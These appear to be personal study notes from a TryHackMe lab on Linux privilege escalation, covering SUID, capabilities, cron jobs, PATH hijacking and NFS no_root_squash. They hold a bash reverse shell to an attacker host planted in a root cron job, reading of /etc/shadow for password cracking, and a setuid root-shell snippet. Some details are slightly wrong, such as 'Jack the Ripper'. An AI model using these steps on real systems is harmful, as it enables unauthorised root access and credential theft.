Linux Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 

via SUID info 

1. Run find / -type f -perm -04000 -ls 2>/dev/null to search for files that have the SUID bit set
2. THM victim's machine has a SUID for the base64 tool, so we can use it to read the etc/passwd or etc/shadow files
3. Since it's encoded in base64, we can use a free online base 64 decoder to crack it
4. Once we have both passwd and shadow files, we can use Jack the Ripper tool to unshadow and merge them
5. Run Jack the Ripper with a database of common passwords to crack the password for the local users on the victim's machine

via Capabilities 

1. getcap -r / 2>dev/null (will produce a lot of errors so let's redirect it to dev/null)
2. ls -l to list permissions of the capabilities

via Crontabs

1. /etc/crontab and check the list of jobs run by root (or account with higher privilege)
2. check if the job is editable using nano <job_path>
3. add a reverse shell script command to the current job: bash -i >& /dev/tcp/<attacker's IP>/<port_number> 0>&1
4. Start the listener on the attacker's IP nc -nlvp <port_number> 
5. When the cronjob is executable, it will spin up a reverse shell with the account that runs the cronjob

via $PATH

1. We need to run a script that will gain access to root shell but it requires a command that is not found on the OS 
2. echo $PATH to view all paths 
3. find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u to view all editable paths
3. Add the external binary to one of the editable paths
4. export PATH='/editable_path':$PATH to add if it's not yet added to $PATH
5. Run the script in the editable_path


via NFS

1. cat etc/exports to view all nfs paths
2. look for the ones with "no_root_squash" - client's root keeps its full power
3. try to see if any of the no_root_squash paths are accesible by the current user (mark it as folder A)
4. on the attacker's machine, showmount -e <target_ip_address> 
5. on the attacker's machine, mkdir a tmp folder and mount it to folder A
   mount -o rw <target_ip_address>:<path_folder_A> <path_tmp_on_attacker_machine>
6. create a script to obtain root shell: setgid(0); setuid(0); system("/bin/bash");, compile it and chmod +s and +x the executable
7. Place the executable into the tmp folder on attacker's machine
8. On the target's machine, the executable should show up
